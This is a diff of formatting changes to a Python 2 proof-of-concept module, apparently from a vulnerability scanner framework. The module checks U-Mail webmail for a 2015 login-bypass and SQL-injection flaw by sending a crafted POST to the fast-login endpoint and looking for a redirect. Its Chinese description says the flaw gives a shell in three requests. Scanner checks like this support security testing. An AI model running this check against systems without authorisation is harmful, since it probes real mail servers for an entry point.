@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'U-Mail_0002' # 平台漏洞编号，留空
+    vuln_id = 'U-Mail_0002'  # 平台漏洞编号，留空
     name = 'U-Mail邮件系统 SQL注入漏洞'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-01-21'  # 漏洞公布时间
     desc = '''
         该邮件系统存在任意用户登录、且存在注入，从而可以无限制完美getshell（getshell过程只需简单三个请求）。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'U-Mail'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '9af15cd2-bdf2-4ca6-ab05-b56cd23f90cd'
@@ -30,20 +32,21 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             postdata = 'mailbox=test@domain.com&link=?'
             verify_url = self.target + '/webmail/fast/index.php?module=operate&action=login'
             r = requests.post(verify_url, data=postdata)
-            
+
             if r.status_code == 200 and '<meta http-equiv="refresh" content="0; URL=index.php">' in r.content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
